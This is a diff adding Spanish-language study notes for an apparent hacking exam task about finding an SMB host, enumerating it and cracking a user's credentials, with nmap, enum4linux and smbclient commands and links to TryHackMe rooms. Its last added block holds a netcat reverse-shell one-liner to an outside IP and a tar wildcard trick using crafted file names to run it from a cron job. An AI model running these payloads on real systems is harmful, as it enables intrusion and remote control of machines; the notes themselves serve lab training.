@@ -91,7 +91,53 @@ nmap -p 80,443,8080 --script=http-title,http-server-header 192.168.1.1-254      
 ```  
 **Nota:**  Hasta este momento no se comento que se explote este servidor, solo se dice que es vulnerable
 
-4. Identify a machine with SMB service enabled in the 192.168.0.0/24 subnet. Crack the SMB credentials for user Henry and obtain Sniff.txt file containing an encoded secret. Decrypt the encoded secret and enter the decrypted text as the answer. Note: Use Henry’s password to decodethe text.
+### 3. Identify a machine with SMB service enabled in the 192.168.0.0/24 subnet. Crack the SMB credentials for user Henry and obtain Sniff.txt file containing an encoded secret. Decrypt the encoded secret and enter the decrypted text as the answer. Note: Use Henry’s password to decodethe text.
+**Objetivo:** Crackear las credenciales de Henry y obtener el archivo sniff.txt, descifrar el archivo que contiene la respuesta
+**Contexto:**
+**Procedimiento:**
+1. Escanear la red en busca de los hosts encendidos
+```
+### Para escanear la red e identificar los hosts encedidos / activos
+sudo nmap -sn 10.200.56.1-255
+### El comando anterior te dará la lista de los hosts activos, y se basa en la sala de tryhackem mencionada abajo
+```
+2. Identificar los puertos relacionados al AD / DC como lo son :  88,135,139,389,445
+
+```
+### Ahora hay que escnear los hosts activos para identificar sus servicios
+sudo nmap -p 445 -sV 192.168.1.##, 192.168.1.##
+sudo nmap -A IpDelServidorConSMB ó utilizar -sC     #Ya que nos dará información como saber si permite ingresar con el usuario guest o anonymo
+### El comando anterior escaneara cuales son los hosts que tiene activos los servicios especificados, el que cuente con los servicios especificados es probable que sea el Domain Controller
+```
+3. Enumerar la SMB
+```
+#Se hace con el siguiente comando
+enumlinux IP
+
+#Nos dará información valiosa como las rutas de la SMB, quizas algun usuario, con la información que nos arroje podemos utilizar otro tipo de ataques u objetner información valiosa
+
+```
+  
+4. Acceder a la SMB
+```
+# Con el siguiente comando podemos ingresar a la SMB
+smbclient //IP/Path                        #Con usuario guest
+smbclient -U milesdyson //$ip/milesdyson   #Especificando algun usuario
+```
+5. Dependiento las rutas a las que se tienen acceso o la información que se pueda acceder a la SMB cambiará el procedimiento
+```
+A continuación un código que ayuda a hacer un reverse shell desde un cronjob 
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> 1234 >/tmp/f" > shell.sh
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+touch "/var/www/html/--checkpoint=1"
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.59.134 9999 >/tmp/f" > shell.sh
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+touch "/var/www/html/--checkpoint=1" 
+```
+**Sala recomendadas:** 
++ https://tryhackme.com/r/room/skynet
++ https://tryhackme.com/r/room/nerdherd
 
 5. An insider attack has been identified in one of the employees mobile device in 192.168.0.0/24 subnet. You are assigned to covertly access the users device and obtain malicious elf files stored in a folder “Scan”. Perform deep scan on the elf files and obtain the last 4 digits of SHA384 hash of the file with highest entropy value.
 
